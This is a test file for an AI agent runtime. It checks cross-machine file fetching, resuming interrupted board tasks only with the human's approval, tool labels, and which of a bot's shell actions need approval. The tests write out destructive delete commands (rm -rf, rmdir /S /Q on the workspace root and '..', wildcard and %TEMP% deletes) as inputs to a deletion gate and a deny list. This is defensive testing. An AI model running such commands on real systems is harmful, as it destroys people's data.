// 1.5.67: three fixes the human approved on 2026-11-24 (「按建议」), from the collaboration eval on 1.5.66.
//   G67-1 files another machine's member names come back only as the result of work (or when asked for) -
//         never for a group's introductions, and not a file it only names as context (11-24: an introduction
//         on the other machine named 口播稿.md and bank.md, and the PC copied both into from-machines/);
//   G67-2 a board item whose machine dropped mid-way is not redone by itself: 「被打断」, the coordinator asks
//         「…断开了，要我让它重做吗？」, and only the human's yes redoes it (the eval's S3-a);
//   G67-3 a connected app's tool on cards, receipts and the remembered lists by its app and title
//         (「Notion · 更新页面」), not `mcp__m2c4a5__notion-update-page`; the stored key stays the same.
// Called from smoke.mjs as stages; kept in its own file so other work on smoke.mjs does not collide.
// IDs used here start with g67 so they never clash with other scenarios.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function until(cond, ms = 5000) {
  const end = Date.now() + ms;
  for (;;) {
    let v;
    try { v = await cond(); } catch { v = false; }
    if (v || Date.now() > end) return v;
    await sleep(20);
  }
}

// A small real team: the runtime's own loop, a scripted model, the real tools.
async function teamRig({ toolsMod, groupsMod, script }) {
  const { AgentRuntime } = await import('../src/agent.mjs');
  const ws = fs.mkdtempSync(path.join(os.tmpdir(), 'lamplit-g67-'));
  const bots = new Map([
    ['g67lead', { id: 'g67lead', name: '主理人', role: '协调', persona: 'WHO:lead', tools: ['fs_list', 'fs_read', 'bot_message'], skills: [], policy: {} }],
    ['g67pub', { id: 'g67pub', name: '发布', role: '发布', persona: 'WHO:pub', tools: ['fs_list', 'fs_write'], skills: [], policy: {} }],
  ]);
  const group = { id: `g67g_${Math.random().toString(36).slice(2, 8)}`, name: 'g67 内容组', coordinatorId: 'g67lead', members: [...bots.values()].map(({ id, name, role, tools }) => ({ id, name, role, tools })) };
  const ev = [];
  const calls = [];
  const cards = [];
  const model = {
    provider: 'fake', model: 'fake',
    complete: async (messages) => {
      const sys = String(messages[0]?.content || '');
      const who = /WHO:(\w+)/.exec(sys)?.[1] || '?';
      const last = String(messages[messages.length - 1]?.content || '');
      const all = messages.map((m) => String(m.content || '')).join('\n');
      calls.push({ who, last, all, at: Date.now() });
      return script({ who, last, all, messages });
    },
  };
  const approvals = {
    cancelForTurn() {}, pendingForTurn: () => [], cancelOrphans: () => [],
    request(req) {
      cards.push(req);
      const p = Promise.resolve({ decision: 'approved', approval: { id: `ap_${cards.length}` } });
      p.record = { id: `ap_${cards.length}` };
      return p;
    },
  };
  let rtRef = null;
  const registry = toolsMod.createRegistry({ workspaceDir: ws, config: {}, getRuntime: () => rtRef });
  const rt = new AgentRuntime({
    config: { workspaceDir: ws, policy: {} }, registry, model,
    bots: { getBot: async (id) => bots.get(id) || [...bots.values()].find((b) => b.name === id) || null, listBots: async () => [...bots.values()] },
    groups: groupsMod, memory: { renderMemoryDigest: async () => '' }, skills: { renderSkillsDigest: async () => '' },
    approvals, bus: { emit: (e) => ev.push({ ...e, at: Date.now() }) },
  });
  rtRef = rt;
  rt.record = async () => {};
  rt.gatherMs = 0;
  rt.ackMs = 100;
  rt.taskDelayMs = 50;
  rt.groupForRun = async (id) => (id === group.id ? { group } : null);
  rt.groups = { ...groupsMod, listGroups: async () => [{ id: group.id, name: group.name, coordinatorId: group.coordinatorId, members: group.members.map((m) => m.id) }] };
  const done = () => fs.rmSync(ws, { recursive: true, force: true });
  return { rt, ev, calls, cards, group, ws, bots, registry, done };
}

const say = (content) => ({ content, toolCalls: [] });
const call = (name, args, id = `c_${Math.random().toString(36).slice(2, 8)}`) => ({ content: '', toolCalls: [{ id, name, arguments: args }] });

/**
 * Another machine, faked: one turn per POST; `turn(n)` gives that turn's messages (or throws: out of reach).
 * Its workspace: `files` {path: mtimeMs}; `stat` false = an older machine that gives no times.
 */
function fakePeer({ turn, files = {}, stat = true, started = Date.now() }) {
  const log = { posts: [], stats: [], gets: [] };
  let n = 0;
  const peers = {
    find: () => ({ name: '另一台' }),
    json: async (_peer, method, p, opts = {}) => {
      if (method === 'POST') { log.posts.push(opts.body); n += 1; return { turnId: `turn_g67far_${n}` }; }
      if (p.startsWith('/api/workspace/stat')) {
        const rel = decodeURIComponent(p.split('path=')[1] || '');
        log.stats.push(rel);
        return stat ? (rel in files ? { exists: true, size: 1, mtimeMs: files[rel] } : { exists: false }) : (rel in files ? { exists: true, size: 1 } : { exists: false });
      }
      return turn(n, `turn_g67far_${n}`, stat ? new Date(started).toISOString() : null);
    },
    call: async (_peer, _method, p) => {
      const rel = decodeURIComponent(p.split('path=')[1] || '');
      log.gets.push(rel);
      return rel in files ? { ok: true, arrayBuffer: async () => new TextEncoder().encode(`内容 ${rel}`).buffer } : { ok: false };
    },
  };
  return { peers, log };
}

// ---------------------------------------------------------------------------
// G67-1: files from another machine come back only as the result of work
// ---------------------------------------------------------------------------
export async function fetchChecks({ check, toolsMod, groupsMod, readText }) {
  const { askPeerBot, asksForFiles } = await import('../src/crossmachine.mjs');
  const now = Date.now();
  const files = { 'scripts/2026-11-24-三期口播稿.md': now - 86400000, 'topics/bank.md': now - 3600000, '交付/选题.md': now + 5000 };
  const reply = '我是选题，负责出视频选题。之前的口播稿在 scripts/2026-11-24-三期口播稿.md，选题库在 topics/bank.md。';
  const workReply = '三个选题写好了：交付/选题.md，参考了 topics/bank.md。';
  const msgs = (text, extra = {}) => (_n, id, startedAt) => [{ turnId: id, role: 'assistant', text }, { turnId: id, role: 'status', status: 'success', ...(startedAt ? { startedAt } : {}), ...extra }];

  // 1. A group's introductions: nothing comes back, nothing is even looked up.
  {
    const r = await teamRig({ toolsMod, groupsMod, script: () => say('好。') });
    const far = { id: 'g67far', name: '选题', role: '选题', remote: { machine: '另一台', botId: 'bot-far' } };
    const group = { ...r.group, members: [...r.group.members, far] };
    const peer = fakePeer({ turn: msgs(reply), files, started: now });
    r.rt.getPeers = () => peer.peers;
    const res = await r.rt.runRemoteGroupTurn({ group, member: far, text: '（这个群刚建好）请用一两句话向大家介绍：你在这个群里负责什么。', role: 'speaker', kickoff: true });
    const copied = fs.existsSync(path.join(r.ws, 'from-machines'));
    const said = (await groupsMod.readGroupMessages(group.id, { limit: 50 })).find((m) => m.from === 'g67far');
    check('G67-1a a member on another machine introducing itself in a new group names two files there: neither is looked up or copied to this machine, and its line in the group says nothing was fetched',
      res.status === 'success' && peer.log.gets.length === 0 && peer.log.stats.length === 0 && !copied && !/已经取回/.test(said?.text || ''),
      JSON.stringify({ gets: peer.log.gets, stats: peer.log.stats, copied, said: said?.text }));
    r.done();
  }

  const ws = fs.mkdtempSync(path.join(os.tmpdir(), 'lamplit-g67f-'));
  try {
    // 2. Work: what this turn made comes back; a file it names as context (made before the turn) stays there.
    const work = fakePeer({ turn: msgs(workReply), files, started: now });
    const got = await askPeerBot(work.peers, { name: '另一台' }, { botId: 'bot-far', text: '（任务板）出三个选题', askedText: '出三个选题', workspaceDir: ws, pollMs: 5 });
    check('G67-1b work handed to it: the file its turn made (交付/选题.md) comes back; topics/bank.md, named as what it read and older than the turn, stays on that machine',
      got.fetched.map((f) => f.from).join() === '交付/选题.md' && !work.log.gets.includes('topics/bank.md'),
      JSON.stringify({ fetched: got.fetched, gets: work.log.gets }));

    // 3. Asked for: the human wants that file - it comes back though it is older.
    const asked = fakePeer({ turn: msgs('选题库在 topics/bank.md，发过来了。'), files, started: now });
    const got2 = await askPeerBot(asked.peers, { name: '另一台' }, { botId: 'bot-far', text: '把选题库发我', workspaceDir: ws, pollMs: 5 });
    const named = fakePeer({ turn: msgs('看了 topics/bank.md，里面有 40 个。'), files, started: now });
    const got3 = await askPeerBot(named.peers, { name: '另一台' }, { botId: 'bot-far', text: 'topics/bank.md 里有几个选题？', workspaceDir: ws, pollMs: 5 });
    check('G67-1c a file the human asked for (「把选题库发我」) or named in the request comes back although it was there before the turn',
      got2.fetched.map((f) => f.from).join() === 'topics/bank.md' && got3.fetched.map((f) => f.from).join() === 'topics/bank.md'
      && asksForFiles('把选题库发我') && asksForFiles('send me the report') && !asksForFiles('出三个选题') && !asksForFiles('大家好，介绍一下自己'),
      JSON.stringify({ asked: got2.fetched, named: got3.fetched }));

    // 4. A machine on an older Lamplit (no times): as before, what the answer names comes back.
    const old = fakePeer({ turn: msgs(workReply), files, stat: false, started: now });
    const got4 = await askPeerBot(old.peers, { name: '另一台' }, { botId: 'bot-far', text: '出三个选题', workspaceDir: ws, pollMs: 5 });
    check('G67-1d a machine on an older Lamplit (its turn says no start time, its files no times) keeps the old way: what the answer names comes back',
      got4.fetched.map((f) => f.from).sort().join() === ['topics/bank.md', '交付/选题.md'].sort().join(), JSON.stringify(got4.fetched));
  } finally { fs.rmSync(ws, { recursive: true, force: true }); }

  const [server, agent] = await Promise.all([readText('../src/server.mjs'), readText('../src/agent.mjs')]);
  check('G67-1e this machine tells others what they need: a file\'s change time (workspace stat) and a turn\'s start (its status line); a group\'s introductions ask for nothing back',
    server.includes('{ exists: true, size: st.size, mtimeMs: Math.round(st.mtimeMs) }') && server.includes('...(record.startedAt ? { startedAt: record.startedAt } : {})')
    && agent.includes('...(kickoff ? { bring: false } : {}),') && agent.includes('askedText: String(text || \'\'),'));
}

// ---------------------------------------------------------------------------
// G67-2: an item cut off by a dropped machine waits for the human's yes
// ---------------------------------------------------------------------------
export async function cutOffChecks({ check, toolsMod, groupsMod, readText }) {
  const A = await import('../src/agent.mjs');
  /** A board with one item for 选题 on the other machine; its first turn there is cut off by a restart. */
  const boardRig = async ({ afterCut }) => {
    const r = await teamRig({ toolsMod, groupsMod, script: ({ who, last }) => (who === 'lead' && /任务板做完了/.test(last) ? say('选题都好了。') : say('好。')) });
    const far = { id: 'g67far', name: '选题', role: '选题', remote: { machine: '另一台', botId: 'bot-far' } };
    const group = { ...r.group, members: [...r.group.members, far] };
    let polls = 0;
    const peer = fakePeer({
      started: Date.now(),
      turn: (n, id, startedAt) => {
        if (n === 1) {
          polls += 1;
          if (polls <= 2) throw Object.assign(new Error('connect ECONNREFUSED'), { code: 'PEER_DOWN' });
          return [{ turnId: id, role: 'assistant', text: '应用重启时这一轮被打断了，没有做完，也不会自动重做。' }, { turnId: id, role: 'status', status: 'needs_attention', recovered: true, startedAt }];
        }
        return afterCut(id, startedAt);
      },
    });
    r.rt.getPeers = () => peer.peers;
    const now = new Date().toISOString();
    const plan = { id: `plan_g67_${Math.random().toString(36).slice(2, 8)}`, groupId: group.id, request: '出三个选题', coordinatorId: 'g67lead', status: 'running', createdAt: now, updatedAt: now,
      tasks: [{ id: 't1', title: '出三个选题', owner: 'g67far', brief: '', deliverable: '', needs: [], status: 'todo', question: '', answer: '', result: '' }] };
    await r.rt.boardChanged(plan);
    await r.rt.runPlan(group, plan);
    return { r, group, plan, peer };
  };

  // 1. Cut off: 被打断, the coordinator asks, nothing is redone; a reply that is not yes/no does not answer it.
  {
    const { r, group, plan, peer } = await boardRig({ afterCut: (id, startedAt) => [{ turnId: id, role: 'assistant', text: '三个选题写好了。' }, { turnId: id, role: 'status', status: 'success', startedAt }] });
    const row = plan.tasks[0];
    const before = { status: plan.status, row: row.status, cut: row.cut?.machine, q: row.question, result: row.result, posts: peer.log.posts.length };
    const asked = (await groupsMod.readGroupMessages(group.id, { limit: 50 })).filter((m) => m.from === 'g67lead' && /断开了，要我让它重做吗/.test(m.text || ''));
    const notice = r.ev.find((e) => e.type === 'human.notice' && /断开了/.test(e.text || ''));
    check('G67-2a a board item whose machine dropped while it worked (that machine restarted) is not redone by itself: it is 被打断 with the reason, the coordinator asks in the group 「「选题」在做「出三个选题」的时候和「另一台」断开了，要我让它重做吗？」, and the phone is told',
      before.status === 'waiting' && before.row === 'waiting_human' && before.cut === '另一台' && /「选题」在做的时候和「另一台」断开了，要我让它重做吗？/.test(before.q)
      && /连接断了/.test(before.result) && before.posts === 1 && asked.length === 1 && /「选题」在做「出三个选题」的时候和「另一台」断开了/.test(asked[0].text) && Boolean(notice),
      JSON.stringify({ before, asked: asked.map((m) => m.text), notice: Boolean(notice) }));
    const other = await r.rt.answerBoard(group, '乙站今天别发');
    check('G67-2b a word in the group that is not a yes or no (「乙站今天别发」) does not answer it: the item keeps waiting and nothing is redone',
      other === false && plan.tasks[0].status === 'waiting_human' && peer.log.posts.length === 1, JSON.stringify({ other, row: plan.tasks[0].status, posts: peer.log.posts.length }));
    const took = await r.rt.answerBoard(group, '重做');
    await until(() => r.rt.plans.get(group.id)?.status === 'done', 12000);
    const again = peer.log.posts[1];
    check('G67-2c the human\'s 「重做」 redoes it: the member there is told it was cut off and to go on from what is written (not as an answer to a question of its own), and the board ends done',
      took === true && peer.log.posts.length === 2 && /用户让你重做/.test(again?.text || '') && !/你之前问过用户/.test(again?.text || '') && again?.handoff?.answered !== true
      && r.rt.plans.get(group.id)?.status === 'done' && r.rt.plans.get(group.id)?.tasks?.[0]?.status === 'done' && !r.rt.plans.get(group.id)?.tasks?.[0]?.cut,
      JSON.stringify({ took, posts: peer.log.posts.length, text: String(again?.text || '').slice(0, 80), status: r.rt.plans.get(group.id)?.status }));
    r.done();
  }

  // 2. 「不用了」: skipped, nothing redone, the board goes on to its end.
  {
    const { r, group, plan, peer } = await boardRig({ afterCut: () => { throw new Error('must not run again'); } });
    const took = await r.rt.answerBoard(group, '不用了');
    await until(() => r.rt.plans.get(group.id)?.status === 'done', 6000);
    check('G67-2d the human\'s 「不用了」: the item is skipped (你说不用重做), nothing is redone, and the board goes on to its end',
      took === true && plan.tasks[0].status === 'skipped' && /你说不用重做/.test(plan.tasks[0].result) && peer.log.posts.length === 1 && r.rt.plans.get(group.id)?.status === 'done',
      JSON.stringify({ took, row: plan.tasks[0].status, result: plan.tasks[0].result, posts: peer.log.posts.length, status: r.rt.plans.get(group.id)?.status }));
    r.done();
  }

  // 3. Out of reach to the end, and what counts as a yes or a no.
  {
    const { askPeerBot } = await import('../src/crossmachine.mjs');
    const gone = fakePeer({ turn: () => { throw new Error('connect ECONNREFUSED'); } });
    const err = await askPeerBot(gone.peers, { name: '另一台' }, { botId: 'bot-far', text: '出三个选题', pollMs: 5, timeoutMs: 60 }).catch((e) => e);
    const blip = fakePeer({ turn: (() => { let k = 0; return (_n, id) => { k += 1; if (k === 1) throw new Error('timeout'); return [{ turnId: id, role: 'assistant', text: '没做成：网站打不开。' }, { turnId: id, role: 'status', status: 'failed' }]; }; })() });
    const failed = await askPeerBot(blip.peers, { name: '另一台' }, { botId: 'bot-far', text: '出三个选题', pollMs: 5 });
    const yes = ['重做', '好的，重做吧', '嗯', '可以', 'ok'].map((t) => A.redoAnswer(t));
    const no = ['不用了', '先别', '算了吧', '不要重做了'].map((t) => A.redoAnswer(t));
    const neither = ['乙站今天别发', '要不要先看看？', '它做到哪了'].map((t) => A.redoAnswer(t));
    check('G67-2e a machine that never comes back within the wait is cut off too (not 没做成 at the work); a turn that failed there on its own after a short blip is not; 「重做」「嗯」 are yes, 「不用了」「先别」 no, a question or anything else neither',
      err?.code === 'PEER_TIMEOUT' && err.lost === true && !failed.interrupted && failed.status === 'failed'
      && yes.every((x) => x === 'yes') && no.every((x) => x === 'no') && neither.every((x) => x === ''),
      JSON.stringify({ err: err?.code, lost: err?.lost, blip: failed.interrupted, yes, no, neither }));
  }

  const [page, en] = await Promise.all([readText('../public/app/main/03-groups.js'), readText('../public/i18n-en.js')]);
  check('G67-2f the board shows such an item as 「被打断」 (with the question and the reason under it), in English too',
    page.includes("t.cut && t.status === 'waiting_human' ? '被打断'") && en.includes('"被打断": "Cut off"'));
}

// ---------------------------------------------------------------------------
// G67-3: a connected app's tool by its app and title
// ---------------------------------------------------------------------------
/** Top-level page functions by name, as source. */
function pageFn(src, name) {
  const m = new RegExp(`\\nfunction ${name}\\([\\s\\S]*?\\n\\}\\r?\\n`).exec(src);
  return m ? m[0] : '';
}

export async function mcpNameChecks({ check, toolsMod, groupsMod, readText }) {
  const M = await import('../src/mcp.mjs');
  check('G67-3a a connected app\'s tool reads 「Notion · 更新页面」 with its own title (title, or annotations.title), else 「Notion · notion update page」 - never mcp__…',
    M.mcpToolLabel({ server: 'Notion', tool: 'notion-update-page', title: '更新页面' }) === 'Notion · 更新页面'
    && M.mcpToolLabel({ server: 'Notion', tool: 'notion-update-page' }) === 'Notion · notion update page'
    && M.mcpToolLabel({ server: 'GitHub', tool: 'createIssue' }) === 'GitHub · create Issue'
    && M.mcpToolTitle({ annotations: { title: '更新页面' } }) === '更新页面' && M.mcpToolTitle({ title: ' 建议 ' }) === '建议' && M.mcpToolTitle({}) === '');

  // On a card: what it asks and what 「以后都允许」 covers; the key stays the tool's name.
  {
    const NAME = 'mcp__m2c4a5__notion-update-page';
    const r = await teamRig({ toolsMod, groupsMod, script: ({ who, messages }) => (who === 'pub' && !messages.some((m) => m.role === 'tool') ? call(NAME, { page: 'p1' }) : say('好了。')) });
    r.registry.tools.set(NAME, { name: NAME, description: '［Notion］更新页面', risk: () => ({ risk: 'LOW' }), parameters: { type: 'object', properties: { page: { type: 'string' } } },
      mcp: { serverId: 'm2c4a5', server: 'Notion', tool: 'notion-update-page', title: '更新页面', readOnly: false }, run: async () => ({ ok: true }) });
    r.registry.mcpGate = () => true;
    r.registry.mcpTrust = () => ({ server: 'Notion', tool: 'notion-update-page', trust: 'ask', readOnly: false });
    await r.rt.runTurn({ botId: 'g67pub', text: '更新那一页', source: 'chat' });
    const card = r.cards[0];
    check('G67-3b the card for a connected app\'s tool says 用「Notion · 更新页面」 and 「以后都允许」 covers 用「Notion · 更新页面」 - no mcp__ id; the rule\'s key is still the tool\'s name, so rules saved before keep working',
      Boolean(card) && /用「Notion · 更新页面」/.test(card.reason || '') && !/mcp__/.test(card.reason || '')
      && card.remember?.key === NAME && card.remember?.label === '用「Notion · 更新页面」',
      JSON.stringify({ reason: card?.reason, remember: card?.remember }));
    r.done();
  }

  // The page: the card's heading, a rule saved before (its label was the raw name), and the lists.
  {
    const [chat, cards, bots, live, en, mcp] = await Promise.all(['../public/app/main/05-chat.js', '../public/app/main/07b-cards.js', '../public/app/main/04-bots.js', '../public/app/main/06-live.js', '../public/i18n-en.js', '../src/mcp.mjs'].map((f) => readText(f)));
    const src = ['mcpToolHuman', 'mcpToolText'].map((n) => pageFn(chat, n)).join('\n') + ['rememberWords', 'rememberedLabel'].map((n) => pageFn(cards, n)).join('\n');
    // eslint-disable-next-line no-new-func
    const make = new Function('mcpUi', 'commandWords', 'cardFileName', `${src}\nreturn { mcpToolHuman, mcpToolText, rememberWords, rememberedLabel };`);
    const ui = { servers: [{ id: 'm2c4a5', name: 'Notion', tools: [{ name: 'notion-update-page', title: '更新页面' }] }] };
    const P = make(ui, () => ({ kind: 'run' }), (x) => x);
    const bare = make({ servers: [] }, () => ({ kind: 'run' }), (x) => x);
    const NAME = 'mcp__m2c4a5__notion-update-page';
    const heading = P.mcpToolText(NAME);
    const old = P.rememberWords({ key: NAME, label: NAME });
    const fresh = bare.rememberWords({ key: NAME, label: '用「Notion · 更新页面」' });
    check('G67-3c on the page: the card says 「Notion · 更新页面」 (想用「Notion」：更新页面); a rule saved before with the raw name as its label now reads 用「Notion · 更新页面」; another machine\'s app this page does not know still reads without mcp__; shell and file rules keep their own words',
      heading?.label === '「Notion · 更新页面」' && heading.title === '想用「Notion」：更新页面' && old === '用「Notion · 更新页面」' && fresh === '用「Notion · 更新页面」'
      && bare.mcpToolText(NAME)?.label === '「连接的应用 · notion update page」' && !/mcp__/.test(bare.rememberWords({ key: NAME, label: NAME }))
      && P.rememberedLabel({ key: 'shell:git', label: '用 git 运行命令' }) === '用 git 运行命令' && P.rememberedLabel({ key: NAME, label: NAME }) === '用「Notion · 更新页面」',
      JSON.stringify({ heading, old, fresh, bare: bare.rememberWords({ key: NAME, label: NAME }) }));
    // The toast after 「以后都允许」 says the hub's own label of the rule just made - the new words (G67-3b).
    check('G67-3d every place a remembered rule shows uses those words: the card\'s 「以后都允许」 line and receipt, its toast (the hub\'s label), the assistant\'s 已记住的权限 and 设置 → 审批; the page gets the tools\' titles from the app; new words are in English too',
      (bots.match(/rememberedLine\(bot, rememberedLabel\(item\), \{ key: item\.key \}/g) || []).length === 2 && live.includes('toast(`好的，以后${res.remembered.label}都不再问你')
      && live.includes('rememberWords(data.remember)') && cards.includes('const label = rememberWords(remember);')
      && mcp.includes('tools: (l?.tools || []).map((t) => ({ name: t.name, ...(mcpToolTitle(t) ? { title: mcpToolTitle(t) } : {})')
      && en.includes('"想用「{0}」：{1}"') && en.includes('"用「{0}」"') && en.includes('"「{0}」"'));
  }
}

// ---------------------------------------------------------------------------
// G67-4..7 (1.5.67, part two; the human, 11-24: "I give a task and get the result. How you get there isn't my
// business; don't keep asking me to approve. And talk less, like Grok Bot."):
//   G67-4 the bot's own work in the workspace runs unasked - its own temp files deleted, scripts, pictures,
//         reading pages; the human's files, places outside, the computer's settings and anything going out ask;
//   G67-5 a finished background job reports to the bot, not to the human: into its running turn, held for its
//         batch, noted when it moved on, a turn only when its work waits on it - never 「告诉用户」 per job;
//   G67-6 every bot is told to talk less; G67-7 no second message saying again what tell_human said.
// ---------------------------------------------------------------------------
/** 发布 with commands, pictures and pages; nothing really runs or goes out. `steps`: its tool calls in order. */
async function workRig({ toolsMod, groupsMod, steps, level = '' }) {
  const seen = [];
  const r = await teamRig({
    toolsMod, groupsMod,
    script: ({ who, messages }) => {
      if (who !== 'pub') return say('好。');
      const n = messages.filter((m) => m.role === 'tool').length;
      if (n) seen.push(String(messages[messages.length - 1].content || ''));
      return n < steps.length ? call(steps[n][0], steps[n][1]) : say('做好了。');
    },
  });
  r.bots.get('g67pub').tools.push('shell', 'fs_delete', 'http_fetch');
  if (level) r.rt.config.policy.level = level;
  const ran = [];
  for (const n of ['shell', 'http_fetch', 'image_generate']) {
    const t = r.registry.get(n);
    if (t) t.run = async (args) => { ran.push([n, args]); return n === 'image_generate' ? { path: 'g67img/pic.png' } : { ok: true, exitCode: 0, stdout: '' }; };
  }
  return { ...r, seen, ran };
}
// With the reason each card gave, so a failing run (the release CI on Linux) shows why it asked.
const asked = (r) => r.cards.map((c) => `${c.toolName}: ${String(c.args?.command || c.args?.path || c.args?.url || '').slice(0, 60)} -> ${String(c.reason || '').slice(0, 120)}`);

export async function ownWorkChecks({ check, toolsMod, groupsMod, readText }) {
  // 1. Its own temp files: made in this work, deleted with del /Q, rmdir /S, rm -rf - no card.
  {
    const r = await workRig({ toolsMod, groupsMod, steps: [
      ['fs_write', { path: 'tmp67/a.png', content: 'x' }], ['fs_write', { path: 'tmp67/b.wav', content: 'x' }], ['fs_write', { path: 'cut67.mp4', content: 'x' }],
      ['shell', { command: 'del /Q tmp67\\a.png' }], ['shell', { command: 'del /Q tmp67\\*.wav && del /F /Q cut67.mp4' }],
      ['shell', { command: 'rmdir /S /Q tmp67' }], ['shell', { command: 'rm -rf tmp67' }], ['shell', { command: 'Remove-Item -Recurse -Force tmp67' }],
    ] });
    await r.rt.runTurn({ botId: 'g67pub', text: '剪一条 15 秒的', source: 'chat' });
    check('G67-4a a bot deleting its own temp files from this work (del /Q, a wildcard in a folder it made, del /F, rmdir /S, rm -rf, Remove-Item -Recurse) is not asked: no card, the commands ran',
      r.cards.length === 0 && r.ran.filter(([n]) => n === 'shell').length === 5, JSON.stringify({ asked: asked(r), ran: r.ran.length }));
    r.done();
  }

  // 2. The human's files, what was there before, outside the workspace, a wildcard that reaches further: asked.
  {
    const cases = [
      ['an upload', (ws) => { fs.mkdirSync(path.join(ws, 'uploads/2026-11-24'), { recursive: true }); fs.writeFileSync(path.join(ws, 'uploads/2026-11-24/封面.png'), 'x'); }, 'del /Q uploads\\2026-11-24\\封面.png'],
      ['a file there before', (ws) => fs.writeFileSync(path.join(ws, '旧稿.md'), 'x'), 'del /Q 旧稿.md'],
      ['a plain rm of a file there before', (ws) => fs.writeFileSync(path.join(ws, '旧稿2.md'), 'x'), 'rm 旧稿2.md'],
      ['a move of a file there before', (ws) => fs.writeFileSync(path.join(ws, '旧稿3.md'), 'x'), 'move 旧稿3.md old\\旧稿3.md'],
      ['outside the workspace', () => {}, `rmdir /S /Q ${path.join(os.tmpdir(), 'g67-outside')}`],
      ['a wildcard at the top of the workspace', () => {}, 'del /Q *.png'],
      ['after cd', () => {}, 'cd tmp67 && del /Q *.png'],
    ];
    const got = [];
    for (const [what, setup, command] of cases) {
      const r = await workRig({ toolsMod, groupsMod, steps: [['fs_write', { path: 'tmp67/a.png', content: 'x' }], ['shell', { command }]] });
      setup(r.ws);
      await sleep(400); // there before the work began
      await r.rt.runTurn({ botId: 'g67pub', text: '清理一下', source: 'chat' });
      got.push([what, r.cards.length, r.ran.length]);
      r.done();
    }
    check('G67-4b deleting or moving what the human uploaded or what was there before the work, anything outside the workspace, a wildcard that could reach other files, or after a cd still asks every time',
      got.every(([, cards, ran]) => cards === 1 && ran === 1), JSON.stringify(got));
  }

  // 3. Work in the workspace at the default level: scripts, pictures, reading a page - unasked; the computer, sends - asked.
  {
    const r = await workRig({ toolsMod, groupsMod, steps: [
      ['shell', { command: 'python make_cut.py --out out67/cut.mp4' }], ['image_generate', { prompt: '封面' }], ['http_fetch', { url: 'https://example.com/a' }],
      ['shell', { command: 'python make_cut.py --out out67/cut.mp4' }],
    ] });
    await r.rt.runTurn({ botId: 'g67pub', text: '做一条视频', source: 'chat' });
    const quiet = r.cards.length;
    const r2 = await workRig({ toolsMod, groupsMod, steps: [['shell', { command: 'npm install -g some-tool' }], ['shell', { command: 'winget install ffmpeg' }], ['http_fetch', { url: 'https://example.com/apply', method: 'POST', body: 'name=a' }]] });
    await r2.rt.runTurn({ botId: 'g67pub', text: '装个工具', source: 'chat' });
    const r3 = await workRig({ toolsMod, groupsMod, level: 'careful', steps: [['fs_write', { path: 'tmp67/a.png', content: 'x' }], ['shell', { command: 'del /Q tmp67\\a.png' }], ['shell', { command: 'python make_cut.py' }]] });
    await r3.rt.runTurn({ botId: 'g67pub', text: '剪一条', source: 'chat' });
    check('G67-4c at the default level a script in the workspace, a picture, reading a page and a retry run unasked; installing software and posting to a site still ask; at 谨慎 everything asks as before',
      quiet === 0 && r.ran.length === 4 && r2.cards.length === 3 && r3.cards.length === 2, JSON.stringify({ quiet: asked(r), install: asked(r2), careful: asked(r3) }));
    r.done(); r2.done(); r3.done();
  }

  const A = await import('../src/agent.mjs');
  const O = await import('../src/ownfiles.mjs');
  const ws = fs.mkdtempSync(path.join(os.tmpdir(), 'g67own-'));
  const own = O.createOwnFiles({ workspaceDir: ws });
  own.note('b', 'tmp67');
  own.note('b', 'cut.mp4');
  const owns = (rel) => own.owns('b', rel);
  const verdicts = {
    mine: O.ownDeleteCommand('del /Q tmp67\\x.png && rm -rf tmp67', { workspaceDir: ws, owns }).ok,
    notMine: O.ownDeleteCommand('del /Q other.png', { workspaceDir: ws, owns }).ok,
    otherBot: own.owns('c', 'tmp67'),
    root: O.ownDeleteCommand(`rmdir /S /Q ${ws}`, { workspaceDir: ws, owns }).ok,
    up: O.ownDeleteCommand('rmdir /S /Q ..', { workspaceDir: ws, owns }).ok,
    uploads: own.note('b', 'uploads/x.png'),
    pipe: O.ownDeleteCommand('dir /b | del /Q tmp67\\x.png', { workspaceDir: ws, owns }).ok,
    vars: O.ownDeleteCommand('del /Q %TEMP%\\x.png', { workspaceDir: ws, owns }).ok,
  };
  fs.rmSync(ws, { recursive: true, force: true });
  const agent = await readText('../src/agent.mjs');
  check('G67-4d only the bot\'s own, by name: its files and what is in a folder it made - never another bot\'s, the workspace itself or above, uploads, a pipe or a variable; the danger list still holds for the rest of a command, and the human\'s rules, the boundary, keys and sends are decided after',
    verdicts.mine && !verdicts.notMine && !verdicts.otherBot && !verdicts.root && !verdicts.up && verdicts.uploads === false && !verdicts.pipe && !verdicts.vars
    && agent.includes('if (ownDel?.ok && matchedDenyPatterns(shellCommand, denyAll).length && !matchedDenyPatterns(ownDel.rest, denyAll).length) {')
    // Not by the ask's reason text (the release CI on Linux); the boundary is held against what is left of the command.
    && !/const ownDel = [^\n]*danger denylist/.test(agent) && agent.includes('checkBoundary(name, ownOnly?.ok ? { ...args, command: ownOnly.rest } : args,') && agent.indexOf('const why = ownWork(') < agent.indexOf('// The human\'s one-sentence rules, matched by meaning.')
    && typeof A.ownWork === 'function' && A.ownWork('shell', { command: 'git push origin main' }) === '' && A.ownWork('image_generate', {}, { generate: 'ask' }) === '',
    JSON.stringify(verdicts));
}

export async function jobReportChecks({ check, toolsMod, groupsMod, readText }) {
  const r = await teamRig({ toolsMod, groupsMod, script: ({ who, all }) => (who === 'pub' ? say(/后台任务/.test(all) ? '成片在 out/cut.mp4。' : '好。') : say('好。')) });
  const before = Date.now() - 60000;
  // Idle, and it moved on since (a later turn): no turn now; its next turn knows.
  await r.rt.runTurn({ botId: 'g67pub', text: '成片发我', source: 'chat' });
  const started = () => r.ev.filter((e) => e.type === 'turn.start' && e.botId === 'g67pub' && !e.aside).length;
  const t0 = started();
  const noted = await r.rt.jobFinished({ botId: 'g67pub', createdAt: before, line: '你之前提交的视频生成好了：videos/c1.mp4（内容：备用镜头）' });
  await sleep(100);
  const noTurn = started() === t0;
  await r.rt.runTurn({ botId: 'g67pub', text: '还有别的吗', source: 'chat' });
  const knew = r.calls.filter((c) => c.who === 'pub').pop()?.all || '';
  // Others of the same request still being made: held.
  const held = await r.rt.jobFinished({ botId: 'g67pub', createdAt: Date.now(), pending: 2, line: '视频生成好了：videos/c2.mp4' });
  // Its work waits on it (nothing since): ONE turn, never 「告诉用户」 per clip.
  const waits = await r.rt.jobFinished({ botId: 'g67pub', createdAt: Date.now() + 5000, line: '你之前提交的 3 个视频都有结果了：…' });
  await until(() => r.ev.some((e) => e.type === 'turn.end' && e.source === 'media'), 3000);
